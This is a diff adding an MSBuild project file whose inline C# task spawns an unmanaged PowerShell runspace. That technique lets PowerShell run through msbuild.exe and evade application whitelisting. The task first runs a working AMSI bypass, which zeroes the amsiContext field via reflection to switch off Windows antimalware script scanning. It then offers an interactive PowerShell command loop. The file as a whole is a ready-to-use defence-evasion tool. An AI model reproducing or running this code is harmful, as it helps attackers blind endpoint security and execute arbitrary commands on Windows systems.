@@ -1,0 +1,183 @@
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Net" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <Target Name="Hello">
+    <ClassExample/>
+  </Target>
+  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Using Namespace="System"/>
+      <Using Namespace="System.Reflection"/>
+      <Using Namespace="System.Diagnostics"/>
+      <Using Namespace="System.Net"/>
+      <Using Namespace="System.Management.Automation"/>
+      <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.IO;
+        using System.Collections.ObjectModel;
+        using System.Management.Automation;
+        using System.Management.Automation.Runspaces;
+        using System.Threading;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class ClassExample : Task
+        {
+            public override bool Execute()
+            {
+                // Start a separate thread for PowerShell execution to avoid blocking MSBuild
+                Thread powerShellThread = new Thread(RunPowerShell);
+                powerShellThread.Start();
+                
+                // Optionally, wait for the thread to finish, if needed
+                // powerShellThread.Join();
+                return true;
+            }
+
+            private void RunPowerShell()
+            {
+                Runspace rs = RunspaceFactory.CreateRunspace();
+                rs.Open();
+                PowerShell ps = PowerShell.Create();
+                ps.Runspace = rs;
+                string currentDirectory = Directory.GetCurrentDirectory();
+
+                Console.Write("PS " + currentDirectory + ">");
+
+                // AMSI bypass code (kept as an example)
+                string amsiBypass = @"
+                $a=[Ref].Assembly.GetTypes(); 
+                Foreach($b in $a) {
+                    if ($b.Name -like ""*iUtils"") {
+                        $c=$b
+                    }
+                };
+                $d=$c.GetFields('NonPublic,Static');
+                Foreach($e in $d) {
+                    if ($e.Name -like ""*Context"") {
+                        $f=$e
+                    }
+                };
+                $g=$f.GetValue($null);
+                [IntPtr]$ptr=$g;
+                [Int32[]]$buf = @(0);
+                [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
+                ";
+
+                // Add the AMSI bypass script to the session
+                ps.AddScript(amsiBypass);
+                ps.Invoke();
+
+                while (true)
+                {
+                    // Print the prompt first
+                    Console.Write("PS " + currentDirectory + "> ");
+                    string cmd = Console.ReadLine();
+                    if (string.IsNullOrWhiteSpace(cmd)) continue;
+
+                    try
+                    {
+                        // Handle 'exit' command separately
+                        if (cmd.Trim().ToLower() == "exit")
+                        {
+                            Console.WriteLine("Exiting PowerShell session...");
+                            break;  // Breaks the loop and ends the session
+                        }
+
+                        // Handle directory navigation commands
+                        if (cmd.StartsWith("cd ") || cmd.StartsWith("Set-Location"))
+                        {
+                            string targetPath = cmd.Substring(cmd.IndexOf(" ") + 1).Trim().Replace("\"", "");
+                            if (Directory.Exists(targetPath))
+                            {
+                                Directory.SetCurrentDirectory(targetPath);
+                                currentDirectory = Directory.GetCurrentDirectory();
+                                ps.AddScript(string.Format("Set-Location \"{0}\"", currentDirectory)).Invoke();
+                            }
+                            else
+                            {
+                                Console.WriteLine("The system cannot find the path specified: " + targetPath);
+                            }
+                            continue;
+                        }
+
+                        // Capture output for all commands (including cmdlets and tools like iex)
+                        ps.AddScript(cmd);
+
+                        // Execute the script
+                        Collection<PSObject> psOutput = ps.Invoke();
+                        Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
+                        Collection<VerboseRecord> verboseRecords = ps.Streams.Verbose.ReadAll();
+                        Collection<ProgressRecord> progressRecords = ps.Streams.Progress.ReadAll();
+
+                        // Handle errors if any
+                        if (errors.Count > 0)
+                        {
+                            foreach (ErrorRecord error in errors)
+                            {
+                                Console.WriteLine("ERROR: " + error.ToString());
+                            }
+                        }
+
+                        // Handle verbose output
+                        if (verboseRecords.Count > 0)
+                        {
+                            foreach (VerboseRecord verbose in verboseRecords)
+                            {
+                                Console.WriteLine("VERBOSE: " + verbose.Message);
+                            }
+                        }
+
+                        // Handle progress output (if any)
+                        if (progressRecords.Count > 0)
+                        {
+                            foreach (ProgressRecord progress in progressRecords)
+                            {
+                                Console.WriteLine("PROGRESS: " + progress.StatusDescription);
+                            }
+                        }
+
+                        // Capture standard output (including cmdlet outputs)
+                        if (psOutput.Count > 0)
+                        {
+                            foreach (PSObject output in psOutput)
+                            {
+                                if (output != null)
+                                {
+                                    // Print the output as a string, without introducing extra line breaks
+                                    Console.WriteLine(output.ToString().Trim());
+                                }
+                            }
+                        }
+
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("**** ERROR ****");
+                        Console.WriteLine(e.Message);
+                    }
+                    finally
+                    {
+                        ps.Commands.Clear();
+                        Console.WriteLine();
+                    }
+                }
+
+                rs.Close();
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
